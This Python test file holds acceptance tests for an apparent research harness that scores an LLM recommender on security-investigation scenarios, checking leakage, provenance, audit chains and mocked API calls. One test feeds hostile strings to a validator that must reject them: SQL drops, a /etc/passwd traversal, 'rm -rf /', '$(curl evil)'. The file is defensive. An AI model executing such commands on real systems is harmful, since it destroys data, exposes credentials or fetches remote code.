"""Acceptance tests 1, 4, 6, 7, 8, 12, 13, 14 (spec section 8) and the Haiku 5.5 request shape."""
import argparse, ast, json, types
from pathlib import Path
import pytest
from cover.models import ContrastCard, ExecutionError, Observation, TraceEvent
from cover.recommender import recommend
from cover.view import LeakageError, assert_no_leak, load_views, view_from_dict
from scoring.replay import Replay
from tests.conftest import ROOT, make_model

LEGACY_SHA = "528750aba89354fe7cf9fd4ee34095c8ae7ad487fb732b0824ff847c2b32ccea"


# ---- 1. baseline preserved; reproduction reported honestly -------------------------------------
def test_legacy_script_preserved_unchanged():
    from cover.config import sha256_file
    assert sha256_file(ROOT / "legacy" / "active_ach_experiment.py") == LEGACY_SHA


def test_report_marks_paper_numbers_not_reproducible(tmp_path):
    from analysis.report import build
    (tmp_path / "e1").mkdir()
    build(tmp_path)
    text = (tmp_path / "report.md").read_text()
    man = json.loads((tmp_path / "manifest.json").read_text())
    assert "NOT REPRODUCIBLE" in text and "53/60" in text
    assert "reproduction_of_paper_numbers" in man["not_run"] and man["status"] == "NOT RUN"


# ---- 4. no hindsight ---------------------------------------------------------------------------
def test_changing_truth_never_changes_recommendations(views, key, sc01_model):
    v, cand, m = sc01_model
    before = recommend(v, "s0", 0, "C1", m, "H1", []).model_dump()
    flipped = json.loads(json.dumps(key))
    flipped["SC-01"]["truth"] = "benign"
    for q in flipped["SC-01"]["queries"].values():
        q["diagnostic"] = not q["diagnostic"]
    # the recommender has no parameter through which the key could enter; re-run must match
    assert recommend(v, "s0", 0, "C1", m, "H1", []).model_dump() == before


# ---- 6. no evidence leakage --------------------------------------------------------------------
def test_runtime_package_never_imports_scorer():
    for py in (ROOT / "cover").glob("*.py"):
        tree = ast.parse(py.read_text())
        for node in ast.walk(tree):
            names = [a.name for a in node.names] if isinstance(node, ast.Import) else (
                [node.module or ""] if isinstance(node, ast.ImportFrom) else [])
            assert not any(n.startswith("scoring") for n in names), f"{py.name} imports scoring"
        assert ".key.json\"" not in py.read_text().replace("endswith(\".key.json\")", "")


def test_runtime_refuses_key_and_master_files():
    with pytest.raises(LeakageError):
        load_views(ROOT / "scenarios" / "dev.key.json")
    with pytest.raises(LeakageError):
        load_views(ROOT / "scenarios" / "dev_master.json")


def test_visible_file_has_no_scorer_fields():
    data = json.loads((ROOT / "scenarios" / "dev.visible.json").read_text())
    assert_no_leak(data)          # raises if any forbidden key is present


def test_leak_guard_fails_closed():
    with pytest.raises(LeakageError):
        view_from_dict({"id": "X", "trigger": "t", "initial_evidence": [], "truth": "benign", "queries": {}, "states": []})
    with pytest.raises(LeakageError):
        assert_no_leak("the reference_outcome is ...")


def test_all_prompts_are_leak_free(views):
    from cover.prompts import rivals_prompt, select_prompt
    for v in views.values():
        for st in v.states:
            rivals_prompt(v, list(st.observed), "benign", True)
            select_prompt(v, list(st.observed), [], [])


# ---- 7. no sham human data ---------------------------------------------------------------------
def test_human_event_requires_authenticated_provenance():
    base = dict(run_id="r", case_id="SC-01", arm="C1", rep=0, turn=0, event_type="recommendation_selected",
                timestamp_utc="t")
    with pytest.raises(Exception):
        TraceEvent(**base, provenance="human")
    TraceEvent(**base, provenance="simulator")


def test_cards_cannot_carry_a_human_choice():
    with pytest.raises(Exception):
        ContrastCard(case_id="x", state_id="s0", turn=0, arm="C1", query_id="Q1", query_text="t", feasible=True,
                     feasibility_reason="ok", leading_hypothesis_id="H1", human_choice="accept")


# ---- 8 + 14. execution errors and safety -------------------------------------------------------
def test_failed_execution_is_an_error_never_no_hit(views, key):
    r = Replay(key)
    v = views["SC-01"]
    for q, kwargs, kind in (("Q99", {}, "unknown_query"), ("Q1", {"unavailable": ("Q1",)}, "telemetry_unavailable"),
                            ("Q1", {"executed_ids": ["Q1"]}, "already_executed")):
        res = r.execute(v, q, **kwargs)
        assert isinstance(res, ExecutionError) and res.kind == kind
    ok = r.execute(v, "Q1")
    assert isinstance(ok, Observation) and ok.source == "simulated_replay_of_reference_map"


@pytest.mark.parametrize("text", ["DELETE FROM events", "x; DROP TABLE logs", "UPDATE users SET a=1",
                                  "cat ../../etc/passwd", "rm -rf /", "$(curl evil)", "`id`"])
def test_unsafe_queries_rejected_before_execution(views, key, text):
    res = Replay(key).execute(views["SC-01"], "Q1", query_text=text)
    assert isinstance(res, ExecutionError) and res.kind == "unsafe_query"


# ---- 12 + 13. end-to-end smoke and negative-result audit ---------------------------------------
@pytest.fixture(scope="module")
def fake_run(tmp_path_factory):
    from analysis.report import build
    from experiments.e1_matched import run_e1
    from experiments.e2_sequential import run_e2
    from cover.view import load_views
    from scoring.reference_judge import load_key
    out = tmp_path_factory.mktemp("run")
    vis, k = ROOT / "scenarios" / "dev.visible.json", ROOT / "scenarios" / "dev.key.json"
    views = [v for v in load_views(vis) if v.id in ("SC-01", "SC-02")]      # one malicious, one benign
    args = argparse.Namespace(visible=str(vis), key=str(k), out=str(out), model="claude-haiku-5-5", reps=2,
                              max_cost=None, pilot=False, fake=True, resume=False, allow_unvalidated=False, seed=1,
                              query_budget=3, arms=["S0", "S1", "C1", "C3", "S0_wrong", "S1_wrong", "C1x_wrong", "C2_wrong"],
                              hunches=["correct", "wrong"], run_id="test")
    keyd = load_key(k)
    run_e1(args, views, keyd)
    run_e2(args, views, keyd)
    build(out)
    return out


def test_audit_chain_complete(fake_run):
    from cover.trace import read_jsonl
    ev = read_jsonl(fake_run / "e2" / "trace.jsonl")
    eps = {(e["case_id"], e["arm"], e["rep"]) for e in ev}
    assert {c for c, _, _ in eps} == {"SC-01", "SC-02"}
    for ep in eps:
        kinds = [e["event_type"] for e in ev if (e["case_id"], e["arm"], e["rep"]) == ep]
        assert kinds[0] == "hypotheses_generated" and kinds[-1] == "verdict"
        if "deferred_to_analyst" not in kinds:
            assert {"recommendation_selected", "query_executed", "observation_received", "belief_updated"} <= set(kinds)
    assert all(e["provenance"] != "human" for e in ev)


def test_every_job_is_scored_including_losses(fake_run):
    from cover.trace import read_jsonl
    e1 = read_jsonl(fake_run / "e1" / "scored_runs.jsonl")
    e2 = read_jsonl(fake_run / "e2" / "scored_runs.jsonl")
    assert len(e1) == 2 * 2 * 2 and len(e2) == 2 * 8 * 2           # nothing dropped
    raw_e1 = read_jsonl(fake_run / "e1" / "raw_runs.jsonl")
    assert len(raw_e1) == len(e1)
    rep = (fake_run / "report.md").read_text()
    assert "FAKE OFFLINE RUN" in rep and "Most adverse to COVER" in rep


def test_raw_logs_hold_no_scorer_fields(fake_run):
    from cover.trace import read_jsonl
    for r in read_jsonl(fake_run / "e1" / "raw_runs.jsonl"):
        assert_no_leak({k: v for k, v in r.items() if k not in ("stress_mask_unavailable",)}, "raw e1 row")


def test_meta_logs_seeds_hashes_and_cache(fake_run):
    meta = json.loads((fake_run / "e1" / "run_meta.json").read_text())
    for k in ("seed", "prompt_sha256", "code_sha256", "config_sha256", "visible_sha256", "cache", "llm"):
        assert k in meta


# ---- Haiku 5.5 request shape (mock client; no network) -----------------------------------------
class _Resp:
    def __init__(self, tool_input):
        self.id, self.model, self.stop_reason = "msg_1", "claude-haiku-5-5", "tool_use"
        self.usage = types.SimpleNamespace(input_tokens=1000, output_tokens=2000)
        self.content = [types.SimpleNamespace(type="tool_use", input=tool_input)]


def test_haiku_request_is_forced_tool_without_temperature_or_thinking():
    from cover.llm import LLM, SELECT_TOOL, Budget
    sent = {}

    class C:
        class messages:
            @staticmethod
            def create(**kw):
                sent.update(kw)
                return _Resp({"query_id": "Q1", "rationale": "r"})

    llm = LLM.__new__(LLM)
    llm.model, llm.fake, llm.budget, llm.seed, llm.strict = "claude-haiku-5-5", False, Budget(1.0), 0, True
    from cover.llm import PROFILES
    llm.profile, llm.client = PROFILES["claude-haiku-5-5"], C
    out, meta = llm.call("prompt", "sys", SELECT_TOOL)
    assert sent["tool_choice"] == {"type": "tool", "name": "select_query"}
    assert "temperature" not in sent and "thinking" not in sent and "top_p" not in sent
    assert sent["tools"][0]["strict"] is True and out["query_id"] == "Q1"
    assert abs(meta["cost_usd"] - (1000 * 0.10 + 2000 * 0.50) / 1e6) < 1e-12


def test_strict_rejection_falls_back_once():
    from cover.llm import LLM, SELECT_TOOL, Budget, PROFILES
    calls = []

    class Err(Exception):
        status_code = 400

    class C:
        class messages:
            @staticmethod
            def create(**kw):
                calls.append(kw["tools"][0].get("strict"))
                if kw["tools"][0].get("strict"):
                    raise Err("tools.0.strict: unsupported")
                return _Resp({"query_id": "Q2", "rationale": "r"})

    llm = LLM.__new__(LLM)
    llm.model, llm.fake, llm.budget, llm.seed, llm.strict = "claude-haiku-5-5", False, Budget(1.0), 0, True
    llm.profile, llm.client = PROFILES["claude-haiku-5-5"], C
    out, meta = llm.call("p", "s", SELECT_TOOL)
    assert calls == [True, None] and meta["strict_tools"] is False and out["query_id"] == "Q2"


def test_long_prompt_pricing_tier():
    from cover.llm import call_cost
    assert call_cost("claude-haiku-5-5", 100_001, 0) == pytest.approx(100_001 * 0.50 / 1e6)


# ---- AIT held-out cases and fair baselines -------------------------------------------------------
def test_ait_files_split_cleanly_and_are_leak_free():
    from cover.view import load_views
    vis = json.loads((ROOT / "scenarios" / "ait.visible.json").read_text())
    assert_no_leak(vis)
    assert "lr_toward_truth" not in json.dumps(vis) and "event_label" not in json.dumps(vis)
    views = load_views(ROOT / "scenarios" / "ait.visible.json")
    from scoring.reference_judge import load_key
    key = load_key(ROOT / "scenarios" / "ait.key.json")
    assert len(views) == 20 and sum(k["truth"] == "malicious" for k in key.values()) == 10


def test_select_prompt_fair_options(views):
    from cover.prompts import select_prompt
    v = views["SC-01"]
    base = select_prompt(v, [], [], [])
    assert "NONE" not in base and "HUNCH" not in base                     # legacy A2 unchanged
    assert "return the id NONE" in select_prompt(v, [], [], [], unavailable=("Q1",), allow_none=True)
    assert "ANALYST'S INITIAL HUNCH" in select_prompt(v, [], [], [], hunch_label="benign")


def test_wrong_hunch_baselines_see_the_hunch(fake_run):
    from cover.trace import read_jsonl
    raw = read_jsonl(fake_run / "e2" / "raw_runs.jsonl")
    s0w = next(e for e in raw if e["arm"] == "S0_wrong")
    assert not s0w["shielded"] and "ANALYST'S INITIAL HUNCH" in s0w["turns"][0]["prompt"]
    assert "ANALYST'S INITIAL HUNCH" in s0w["turns"][0]["select"]["prompt"]
    c2w = next(e for e in raw if e["arm"] == "C2_wrong")
    assert c2w["shielded"] and "ANALYST'S INITIAL HUNCH" not in c2w["turns"][0]["prompt"]
